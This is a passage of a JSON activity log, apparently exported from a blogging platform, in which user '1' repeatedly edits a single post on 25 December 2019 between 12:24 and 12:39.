12:24:47"},{"id":"5e0355212ee0ee0001819cfa","resource_id":"5e0067842ee0ee000181987b","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-12-25 12:25:05"},{"id":"5e03552f2ee0ee0001819cfc","resource_id":"5e0067842ee0ee000181987b","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-12-25 12:25:19"},{"id":"5e0355362ee0ee0001819cfe","resource_id":"5e0067842ee0ee000181987b","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-12-25 12:25:26"},{"id":"5e03553e2ee0ee0001819d00","resource_id":"5e0067842ee0ee000181987b","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-12-25 12:25:34"},{"id":"5e0355542ee0ee0001819d02","resource_id":"5e0067842ee0ee000181987b","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-12-25 12:25:56"},{"id":"5e0355692ee0ee0001819d04","resource_id":"5e0067842ee0ee000181987b","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-12-25 12:26:17"},{"id":"5e03557c2ee0ee0001819d06","resource_id":"5e0067842ee0ee000181987b","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-12-25 12:26:36"},{"id":"5e0355862ee0ee0001819d08","resource_id":"5e0067842ee0ee000181987b","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-12-25 12:26:46"},{"id":"5e0355922ee0ee0001819d0a","resource_id":"5e0067842ee0ee000181987b","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-12-25 12:26:58"},{"id":"5e0355e52ee0ee0001819d0c","resource_id":"5e0067842ee0ee000181987b","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-12-25 12:28:21"},{"id":"5e0355e92ee0ee0001819d0e","resource_id":"5e0067842ee0ee000181987b","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-12-25 12:28:25"},{"id":"5e0355f12ee0ee0001819d10","resource_id":"5e0067842ee0ee000181987b","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-12-25 12:28:33"},{"id":"5e0356be2ee0ee0001819d12","resource_id":"5e0067842ee0ee000181987b","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-12-25 12:31:58"},{"id":"5e0356e12ee0ee0001819d14","resource_id":"5e0067842ee0ee000181987b","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-12-25 12:32:33"},{"id":"5e0356e82ee0ee0001819d16","resource_id":"5e0067842ee0ee000181987b","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-12-25 12:32:40"},{"id":"5e03570f2ee0ee0001819d18","resource_id":"5e0067842ee0ee000181987b","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-12-25 12:33:19"},{"id":"5e0357322ee0ee0001819d1a","resource_id":"5e0067842ee0ee000181987b","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-12-25 12:33:54"},{"id":"5e03573f2ee0ee0001819d1c","resource_id":"5e0067842ee0ee000181987b","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-12-25 12:34:07"},{"id":"5e0357472ee0ee0001819d1e","resource_id":"5e0067842ee0ee000181987b","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-12-25 12:34:15"},{"id":"5e0357542ee0ee0001819d20","resource_id":"5e0067842ee0ee000181987b","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-12-25 12:34:28"},{"id":"5e0357662ee0ee0001819d22","resource_id":"5e0067842ee0ee000181987b","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-12-25 12:34:46"},{"id":"5e0357752ee0ee0001819d24","resource_id":"5e0067842ee0ee000181987b","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-12-25 12:35:01"},{"id":"5e0357842ee0ee0001819d26","resource_id":"5e0067842ee0ee000181987b","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-12-25 12:35:16"},{"id":"5e0357b22ee0ee0001819d28","resource_id":"5e0067842ee0ee000181987b","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-12-25 12:36:02"},{"id":"5e0357ba2ee0ee0001819d2a","resource_id":"5e0067842ee0ee000181987b","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-12-25 12:36:10"},{"id":"5e0357c72ee0ee0001819d2c","resource_id":"5e0067842ee0ee000181987b","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-12-25 12:36:23"},{"id":"5e0357ce2ee0ee0001819d2e","resource_id":"5e0067842ee0ee000181987b","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-12-25 12:36:30"},{"id":"5e0357f32ee0ee0001819d30","resource_id":"5e0067842ee0ee000181987b","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-12-25 12:37:07"},{"id":"5e0358032ee0ee0001819d32","resource_id":"5e0067842ee0ee000181987b","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-12-25 12:37:23"},{"id":"5e03580f2ee0ee0001819d34","resource_id":"5e0067842ee0ee000181987b","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-12-25 12:37:35"},{"id":"5e0358142ee0ee0001819d36","resource_id":"5e0067842ee0ee000181987b","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-12-25 12:37:40"},{"id":"5e0358272ee0ee0001819d38","resource_id":"5e0067842ee0ee000181987b","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-12-25 12:37:59"},{"id":"5e0358302ee0ee0001819d3a","resource_id":"5e0067842ee0ee000181987b","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-12-25 12:38:08"},{"id":"5e03583f2ee0ee0001819d3c","resource_id":"5e0067842ee0ee000181987b","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-12-25 12:38:23"},{"id":"5e0358432ee0ee0001819d3e","resource_id":"5e0067842ee0ee000181987b","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-12-25 12:38:27"},{"id":"5e0358522ee0ee0001819d40","resource_id":"5e0067842ee0ee000181987b","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-12-25 12:38:42"},{"id":"5e03586a2ee0ee0001819d42","resource_id":"5e0067842ee0ee000181987b","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-12-25 12:39:06"},{"id":"5e0358792ee0ee0001819d44","resource_id":"5e0067842ee0ee000181987b","resource_type":"post","actor_id":"1","actor_type":"user","event":"edited","context":null,"created_at":"2019-12-25 12:39:21"}]}}]}